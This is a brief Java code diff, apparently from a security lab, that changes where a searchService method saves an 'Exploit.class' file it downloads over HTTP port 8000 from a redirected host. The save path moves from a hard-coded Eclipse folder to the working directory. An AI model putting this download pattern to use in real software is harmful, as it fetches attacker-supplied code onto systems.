@@ -173,8 +173,9 @@ public class searchService {
                 
                 System.out.println(redirect_add);
                 String fileUrl = "http://"+redirect_add+":8000/Exploit.class"; // 리다이렉션된 URL
-                String savePath = "/Users/hanmin/eclipse/jee-2024-03/Eclipse.app/Contents/MacOS/"; // 파일을 저장할 경로
+                
                 String currentDir = System.getProperty("user.dir");
+                String savePath = currentDir+"/"; // 파일을 저장할 경로
                 System.out.println("Current working directory: " + currentDir);
                 downloadFileFromURL(fileUrl, savePath);
 
